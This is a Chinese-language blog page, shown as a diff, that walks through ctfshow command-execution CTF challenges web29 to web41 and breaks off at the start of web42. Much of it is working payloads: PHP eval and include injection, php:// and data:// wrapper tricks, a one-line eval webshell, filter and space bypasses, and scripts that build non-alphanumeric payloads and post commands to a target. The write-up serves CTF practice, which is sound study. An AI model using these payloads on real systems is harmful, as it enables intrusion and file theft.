@@ -1,0 +1,1269 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>命令执行(ctfshow) | Secfeng</title>
+  <meta name="keywords" content=" rce ">
+  <meta name="description" content="命令执行(ctfshow) | Secfeng">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta property="og:type" content="website">
+<meta property="og:title" content="about">
+<meta property="og:url" content="http://example.com/about/index.html">
+<meta property="og:site_name" content="Secfeng">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-03-05T11:53:12.000Z">
+<meta property="article:modified_time" content="2023-03-28T14:09:40.008Z">
+<meta property="article:author" content="Secfeng">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-dark.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="/img/avatar.jpg"/>
+</a>
+<div class="author">
+    <span>Secfeng</span>
+</div>
+
+<div class="icon">
+    
+        
+    
+        
+            <a title="github"
+               href="https://github.com/secfeng"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="全部文章">全部文章
+            
+                <small>(15)</small>
+            
+        </div>
+    </li>
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+            
+    </div>
+    <div>
+        
+            <a class="about  hasFriend  site_url"
+               
+               href="/about">关于</a>
+        
+        <a style="width: 50%"
+                
+                                           class="friends">友链</a>
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="15">
+<input type="hidden" id="yelog_site_word_count" value="27.7k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">全部文章</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">大纲</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>文件包含</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>文件上传</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>linux</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>php</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>rce</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>sql</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>xss</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>yii</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <div id="local-search-result">
+
+    </div>
+    
+    <nav id="title-list-nav">
+        
+        
+        <a  class="全部文章 "
+           href="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
+           data-tag="yii"
+           data-author="" >
+            <span class="post-title" title="yii2框架反序列化漏洞复现">yii2框架反序列化漏洞复现</span>
+            <span class="post-date" title="2023-05-29 16:22:42">2023/05/29</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/05/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
+           data-tag="php"
+           data-author="" >
+            <span class="post-title" title="php反序列化">php反序列化</span>
+            <span class="post-date" title="2023-05-27 20:16:39">2023/05/27</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/"
+           data-tag="php"
+           data-author="" >
+            <span class="post-title" title="php反序列化(ctfshow)">php反序列化(ctfshow)</span>
+            <span class="post-date" title="2023-05-09 20:42:55">2023/05/09</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(%E6%B7%B7%E5%90%88)/"
+           data-tag="文件包含"
+           data-author="" >
+            <span class="post-title" title="文件包含(混合)">文件包含(混合)</span>
+            <span class="post-date" title="2023-04-25 15:59:18">2023/04/25</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/"
+           data-tag="文件包含"
+           data-author="" >
+            <span class="post-title" title="文件包含(ctfshow)">文件包含(ctfshow)</span>
+            <span class="post-date" title="2023-04-25 10:39:55">2023/04/25</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(%E6%B7%B7%E5%90%88)/"
+           data-tag="文件上传"
+           data-author="" >
+            <span class="post-title" title="文件上传(混合)">文件上传(混合)</span>
+            <span class="post-date" title="2023-04-23 19:50:53">2023/04/23</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/"
+           data-tag="文件上传"
+           data-author="" >
+            <span class="post-title" title="文件上传(upload-labs)">文件上传(upload-labs)</span>
+            <span class="post-date" title="2023-04-19 14:08:07">2023/04/19</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/16/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(%E6%B7%B7%E5%90%88)/"
+           data-tag="rce"
+           data-author="" >
+            <span class="post-title" title="命令执行(混合)">命令执行(混合)</span>
+            <span class="post-date" title="2023-04-16 21:26:25">2023/04/16</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/16/sql%E6%B3%A8%E5%85%A5(%E6%B7%B7%E5%90%88)/"
+           data-tag="sql"
+           data-author="" >
+            <span class="post-title" title="sql注入(混合)">sql注入(混合)</span>
+            <span class="post-date" title="2023-04-16 21:23:53">2023/04/16</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/14/linux%E5%AD%A6%E4%B9%A0/"
+           data-tag="linux"
+           data-author="" >
+            <span class="post-title" title="linux学习">linux学习</span>
+            <span class="post-date" title="2023-04-14 22:24:49">2023/04/14</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/"
+           data-tag="rce"
+           data-author="" >
+            <span class="post-title" title="命令执行(ctfshow)">命令执行(ctfshow)</span>
+            <span class="post-date" title="2023-04-09 19:52:07">2023/04/09</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"
+           data-tag="php"
+           data-author="" >
+            <span class="post-title" title="php伪协议">php伪协议</span>
+            <span class="post-date" title="2023-04-04 22:21:18">2023/04/04</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/"
+           data-tag="php"
+           data-author="" >
+            <span class="post-title" title="php特性(ctfshow)">php特性(ctfshow)</span>
+            <span class="post-date" title="2023-04-03 15:56:51">2023/04/03</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/03/28/xss%E5%B8%B8%E8%A7%81%E7%9A%84%E8%A7%A6%E5%8F%91%E6%A0%87%E7%AD%BE/"
+           data-tag="xss"
+           data-author="" >
+            <span class="post-title" title="xss常见的触发标签">xss常见的触发标签</span>
+            <span class="post-date" title="2023-03-28 20:37:01">2023/03/28</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/03/28/xsslabs/"
+           data-tag="xss"
+           data-author="" >
+            <span class="post-title" title="xsslabs">xsslabs</span>
+            <span class="post-date" title="2023-03-28 16:24:23">2023/03/28</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-命令执行(ctfshow)" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">命令执行(ctfshow)</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color4">rce</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            发布时间 : <time class="date" title='最后更新: 2023-05-01 16:52:55'>2023-04-09 19:52</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>字数:5k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfshow"><span class="toc-text">ctfshow</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E5%9E%8B%E4%B8%80-%E5%8F%98%E9%87%8Fc%E6%9D%A5%E6%8E%A5%E5%8F%97%E5%B9%B6%E8%BF%87%E6%BB%A4%E4%BC%A0%E5%85%A5%E7%9A%84%E6%95%B0%E6%8D%AE-eval%E5%87%BD%E6%95%B0%E6%9D%A5%E6%89%A7%E8%A1%8C"><span class="toc-text">类型一:变量c来接受并过滤传入的数据,eval函数来执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web29"><span class="toc-text">web29</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web30"><span class="toc-text">web30</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web31"><span class="toc-text">web31</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web32"><span class="toc-text">web32</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web33-36"><span class="toc-text">web33-36</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E5%9E%8B%E4%BA%8C-%E5%8F%98%E9%87%8Fc%E6%8E%A5%E6%94%B6%E5%B9%B6%E8%BF%87%E6%BB%A4%E4%BC%A0%E5%85%A5%E7%9A%84%E6%95%B0%E6%8D%AE-include%E6%9D%A5%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6"><span class="toc-text">类型二:变量c接收并过滤传入的数据,include来包含文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web37"><span class="toc-text">web37</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web38"><span class="toc-text">web38</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web39"><span class="toc-text">web39</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web40-%E5%B1%9E%E4%BA%8E%E7%B1%BB%E5%9E%8B%E4%B8%80"><span class="toc-text">web40  属于类型一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web41-%E5%B1%9E%E4%BA%8E%E7%B1%BB%E5%9E%8B%E4%B8%80"><span class="toc-text">web41 属于类型一</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E5%9E%8B%E4%B8%89-%E6%8E%A5%E5%8F%97%E5%B9%B6%E8%BF%87%E6%BB%A4%E4%BC%A0%E5%85%A5%E7%9A%84%E5%8F%98%E9%87%8F%E6%8B%BC%E6%8E%A5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88system%E5%87%BD%E6%95%B0%EF%BC%89"><span class="toc-text">类型三:接受并过滤传入的变量拼接命令执行（system函数）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web42"><span class="toc-text">web42</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web43"><span class="toc-text">web43</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web44"><span class="toc-text">web44</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web45"><span class="toc-text">web45</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web46"><span class="toc-text">web46</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web47-49"><span class="toc-text">web47-49</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web50"><span class="toc-text">web50</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web51"><span class="toc-text">web51</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web52"><span class="toc-text">web52</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web53"><span class="toc-text">web53</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web54"><span class="toc-text">web54</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web55"><span class="toc-text">web55</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web56"><span class="toc-text">web56</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web57"><span class="toc-text">web57</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web58-65"><span class="toc-text">web58-65</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web66"><span class="toc-text">web66</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web67"><span class="toc-text">web67</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web68"><span class="toc-text">web68</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web69-70"><span class="toc-text">web69-70</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web71"><span class="toc-text">web71</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web72"><span class="toc-text">web72</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web73-74"><span class="toc-text">web73-74</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web75-76"><span class="toc-text">web75-76</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web77"><span class="toc-text">web77</span></a></li></ol></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h1><h2 id="类型一-变量c来接受并过滤传入的数据-eval函数来执行"><a href="#类型一-变量c来接受并过滤传入的数据-eval函数来执行" class="headerlink" title="类型一:变量c来接受并过滤传入的数据,eval函数来执行"></a>类型一:变量c来接受并过滤传入的数据,eval函数来执行</h2><h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><p>使用通配符*或?或’’等等绕过flag</p>
+<pre><code>payload 
+1.c=system(&quot;cat f*&quot;);
+2.c=echo `cat f*`;
+3.c=echo `nl fl&#39;&#39;ag.php`;或c=echo `nl fl&quot;&quot;ag.php`;//nl命令在linux系统中用来计算文件中行号。nl 可以将输出的文件内容自动的加上行号
+4.c=echo `nl fl\ag.php`;   //转义字符绕过
+5.c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php //通过变量赋值直接绕过c的过滤
+?ip=127.0.0.1;cat `ls` //内联执行，就是将反引号内命令的输出作为输入执行
+cp fla&#123;g.php,G&#125;    //把flag.php复制为flaG
+</code></pre>
+<p>可以读取文件的函数：</p>
+<pre><code>readfile()		读取文件 
+highlight_file()	读文件 
+show_source()		同上 
+base64_decode()		base64解码 
+strrev()		反转字符串
+include()		文件包含，可以不使用括号
+require()		完全可以替代include()
+</code></pre>
+<h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><pre><code>payload ?c=echo `cat f*`;
+</code></pre>
+<p>其他可代替system函数：</p>
+<pre><code>system()
+passthru() 
+exec() 
+shell_exec() 
+popen() 
+proc_open()
+pcntl_exec() 
+反引号 同shell_exec()
+</code></pre>
+<h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><pre><code>payload c=echo%09`tac%09f*`;
+</code></pre>
+<p>文件读取命令</p>
+<pre><code>more:	一页一页的显示档案内容
+less:	与 more 类似 head:查看头几行
+tac:	从最后一行开始显示，可以看出 tac 是cat 的反向显示
+tail:	查看尾几行
+nl:	显示内容，顺便输出行号
+od:	以二进制的方式读取档案内容
+vi:	一种编辑器，这个也可以查看
+vim:	一种编辑器，这个也可以查看
+sort:	文件排序并输出也可以查看内容
+uniq:	可以查看 file -f:报错出具体内容
+grep	grep &#123; flag.php打印有”&#123;“的一行
+strings: 在对象文件或二进制文件中查找可打印的字符串, 在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings。通常用法：strings\$IFS\$9f*(必须加转义字符)
+paste	把每个文件以列对列的方式，一列列地加以合并
+sed	一种编辑器，可以用sed -f flag.php读取flag
+awk
+curl
+cut
+</code></pre>
+<p>linux绕过空格</p>
+<pre><code>cat%09flag  //tab
+&#123;cat,flag.txt&#125; 
+cat$&#123;IFS&#125;$9flag.txt  //$IFS在linux下表示为空格
+cat&#123;IFS&#125;flag.txt
+cat$IFSflag.txt
+cat$&#123;IFS&#125;flag.txt
+cat$IFS$1flag.txt //$1改成$加其他数字都行
+catIFSflag.txt
+cat&lt;flag.txt 
+cat&lt;&gt;flag.txt 
+ca\t fl\ag
+</code></pre>
+<h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><pre><code>payload 1.c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(&quot;ls&quot;);?&gt; 
+        2.c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php
+        3.c=require$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php
+</code></pre>
+<p>include可以不用括号,分号用?&gt;代替</p>
+<h3 id="web33-36"><a href="#web33-36" class="headerlink" title="web33-36"></a>web33-36</h3><p>这四关都可以前面的payload，36关只需把1换成a就行了</p>
+<pre><code>payload 1.c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php
+        2.c=require$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php
+</code></pre>
+<p>php总比较常用的可以不加括号的函数有:</p>
+<pre><code>`echo`、`print`、`isset`、`unset`、`include`、`require`
+</code></pre>
+<h2 id="类型二-变量c接收并过滤传入的数据-include来包含文件"><a href="#类型二-变量c接收并过滤传入的数据-include来包含文件" class="headerlink" title="类型二:变量c接收并过滤传入的数据,include来包含文件"></a>类型二:变量c接收并过滤传入的数据,include来包含文件</h2><h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><p>这关要用到php伪协议data:&#x2F;&#x2F;</p>
+<pre><code>payload ?c=data://text/plain,&lt;?php system(&quot;cat f*&quot;);?&gt;
+        ?c=data:,&lt;?php @eval($_POST[&#39;shell&#39;]); ?&gt;  //可以直接用蚁剑连接
+</code></pre>
+<h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><p>过滤了php和file，可以用&lt;?&#x3D;或进行base64编码</p>
+<pre><code>payload c=data://text/plain,&lt;?=system(&quot;cat f*&quot;);?&gt;
+        c=data:text/base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhKiIpOw==
+</code></pre>
+<h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><pre><code>payload c=data://text/plain,&lt;?php system(&quot;cat fla*&quot;);?&gt;
+</code></pre>
+<p>.php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么作用</p>
+<h3 id="web40-属于类型一"><a href="#web40-属于类型一" class="headerlink" title="web40  属于类型一"></a>web40  属于类型一</h3><p>此题考察无参数函数构造，参考大佬们写的：</p>
+<p>函数：print_r(scandir(‘.’))可以用来查看当前目录所有文件名，我们要做的是将括号中的.替换掉</p>
+<p>localeconv()函数返回一包含本地数字及货币格式信息的数组，如下只是该函数的一部分数组元素</p>
+<img src="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/44337.png" class="">
+
+<p>可利用localeconv()函数返回数组中的第一个小数点代替读取目录函数print_r(scandir(‘.’))中的参数 .<br>那么如何将数组中的第一个元素读取出来呢？可以使用以下函数：</p>
+<pre><code>current()函数返回数组中的当前元素/单元，默认取第一个值； 
+pos()函数同上，是current()函数的别名； 
+reset()函数，当数组不为空时返回数组第一个单元的值，如果数组为空则返回FALSE
+</code></pre>
+<p>可以得到flag.php位于数组的第三个值里，也就是倒数第二个，我们可以通过array_reverse()函数以相反的元素顺序返回数组，在用next()函数读取下一个元素，最后通过highlight_file()函数读取到flag.php</p>
+<pre><code>payload ①?c=print_r(scandir(pos(localeconv())));
+        ②?c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));
+</code></pre>
+<p>更多操作参考<a target="_blank" rel="noopener" href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p>
+<h3 id="web41-属于类型一"><a href="#web41-属于类型一" class="headerlink" title="web41 属于类型一"></a>web41 属于类型一</h3><p>这关是无字母数字命令执行</p>
+<p>p神原话：在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。</p>
+<p>以下参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/Sapphire037/article/details/121054836">https://blog.csdn.net/Sapphire037/article/details/121054836</a></p>
+<p>通过代码审计我们可以知道这个题过滤了$、+、-、^、~使得异或自增和取反构造字符都无法使用，但是留了一个<code>|</code>也就是或运算还可以用，这个时候利用Y4师傅和羽师傅的脚本结合，即可很方便的做出来这题。先看Y4师傅的脚本</p>
+<pre><code class="php">&lt;?php
+/*
+# -*- coding: utf-8 -*-
+# @Author: Y4tacker
+# @Date:   2020-11-21 20:31:22
+*/
+//或
+function orRce($par1, $par2)&#123;
+    $result = (urldecode($par1)|urldecode($par2));
+    return $result;
+&#125;
+//异或
+function xorRce($par1, $par2)&#123;
+    $result = (urldecode($par1)^urldecode($par2));
+    return $result;
+&#125;
+//取反
+function negateRce()&#123;
+    fwrite(STDOUT,&#39;[+]your function: &#39;);
+    $system=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN));
+    fwrite(STDOUT,&#39;[+]your command: &#39;);
+    $command=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN));
+    echo &#39;[*] (~&#39;.urlencode(~$system).&#39;)(~&#39;.urlencode(~$command).&#39;);&#39;;
+&#125;
+//mode=1代表或，2代表异或，3代表取反
+//取反的话，就没必要生成字符去跑了，因为本来就是不可见字符，直接绕过正则表达式
+function generate($mode, $preg=&#39;/[0-9]/i&#39;)&#123;
+    if ($mode!=3)&#123;
+        $myfile = fopen(&quot;rce.txt&quot;, &quot;w&quot;);
+        $contents = &quot;&quot;;
+        for ($i=0;$i&lt;256;$i++)&#123;
+            for ($j=0;$j&lt;256;$j++)&#123;
+                if ($i&lt;16)&#123;
+                    $hex_i = &#39;0&#39;.dechex($i);
+                &#125;else&#123;
+                    $hex_i = dechex($i);
+                &#125;
+                if ($j&lt;16)&#123;
+                    $hex_j = &#39;0&#39;.dechex($j);
+                &#125;else&#123;
+                    $hex_j = dechex($j);
+                &#125;
+                if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;
+                    echo &quot;&quot;;
+                &#125;else&#123;
+                    $par1 = &quot;%&quot;.$hex_i;
+                    $par2 = &#39;%&#39;.$hex_j;
+                    $res = &#39;&#39;;
+                    if ($mode==1)&#123;
+                        $res = orRce($par1, $par2);
+                    &#125;else if ($mode==2)&#123;
+                        $res = xorRce($par1, $par2);
+                    &#125;
+                    if (ord($res)&gt;=32&amp;ord($res)&lt;=126)&#123;
+                        $contents=$contents.$res.&quot; &quot;.$par1.&quot; &quot;.$par2.&quot;\n&quot;;
+                    &#125;
+                &#125;
+            &#125;
+        &#125;
+        fwrite($myfile,$contents);
+        fclose($myfile);
+    &#125;else&#123;
+        negateRce();
+    &#125;
+&#125;
+generate(1,&#39;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#39;);
+//1代表模式，后面的是过滤规则
+</code></pre>
+<p>再利用羽师傅的脚本</p>
+<pre><code class="python"># -*- coding: utf-8 -*-
+import requests
+import urllib
+from sys import *
+import os
+os.system(&quot;php D:\\phpstudy_pro\\WWW\\rce.php&quot;)  # 没有将php写入环境变量需手动运行
+if (len(argv) != 2):
+    print(&quot;=&quot; * 50)
+    print(&#39;USER：python exp.py &lt;url&gt;&#39;)
+    print(&quot;eg：  python exp.py http://ctf.show/&quot;)
+    print(&quot;=&quot; * 50)
+    exit(0)
+url = argv[1]
+def action(arg):
+    s1 = &quot;&quot;
+    s2 = &quot;&quot;
+    for i in arg:
+        f = open(r&quot;D:\phpstudy_pro\WWW\rce.txt&quot;, &quot;r&quot;)//填txt的文件位置
+        while True:
+            t = f.readline()
+            if t == &quot;&quot;:
+                break
+            if t[0] == i:
+                # print(i)
+                s1 += t[2:5]
+                s2 += t[6:9]
+                break
+        f.close()
+    output = &quot;(\&quot;&quot; + s1 + &quot;\&quot;|\&quot;&quot; + s2 + &quot;\&quot;)&quot;
+    return (output)
+while True:
+    param = action(input(&quot;\n[+] your function：&quot;)) + action(input(&quot;[+] your command：&quot;))
+    data = &#123;
+        &#39;c&#39;: urllib.parse.unquote(param)
+    &#125;
+    r = requests.post(url, data=data)
+    print(&quot;\n[*] result:\n&quot; + r.text)
+</code></pre>
+<p>上面就注意下php脚本的位置和生成的rce.txt的位置还有接受的参数比如上面是c，换个参数就把c改了就行</p>
+<p>那么完整流程就是</p>
+<pre><code>1.先改一下php脚本中generate函数里的参数，也就是设置模式和正则
+2.python rce_.py url
+</code></pre>
+<p>可以看看p神的博客</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></p>
+<h2 id="类型三-接受并过滤传入的变量拼接命令执行（system函数）"><a href="#类型三-接受并过滤传入的变量拼接命令执行（system函数）" class="headerlink" title="类型三:接受并过滤传入的变量拼接命令执行（system函数）"></a>类型三:接受并过滤传入的变量拼接命令执行（system函数）</h2><h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><p>&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1 也可以写成“1&gt; &#x2F;dev&#x2F;null 2&gt; &amp;1”,我们写入的命令的执行结果会被黑洞吞掉。</p>
+<p>分隔符变量拼接可以用分隔符来控制后面语句的执行</p>
+<p>分割符</p>
+<pre><code>; 分号顺序执行
